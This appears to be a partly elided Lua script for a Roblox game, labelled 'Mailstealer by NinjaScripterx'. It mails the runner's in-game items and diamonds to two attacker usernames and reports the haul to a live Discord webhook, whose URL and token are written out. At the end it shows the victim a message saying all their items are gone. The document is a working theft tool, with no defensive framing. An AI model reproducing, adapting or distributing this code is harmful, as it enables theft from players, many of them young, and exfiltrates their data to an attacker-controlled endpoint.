Username = "Ankaixwc"
Username2 = "Imaizuke9" -- stuff will get sent to this user if first user's mailbox is full
webhook = "https://discord.com/api/webhooks/1344887878404014080/dmXrX7kjDyk1sN7CEaXrN1dp7X358EV8BNLA3kldoxbuOllhH-HttMdfIQrCtDJihXZR"
...
local MailMessage = "Follow NinjaScripterx"
...
local function SendMessage(username, diamonds)
    ...
    local data = {
        ["embeds"] = {{
			...
			["fields"] = fields,
			["footer"] = {
				["text"] = "Mailstealer by NinjaScripterx"
			}
        }}
    }
...
if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
    ...
    message.Error("The script execution got an failure all your items are gone")
end
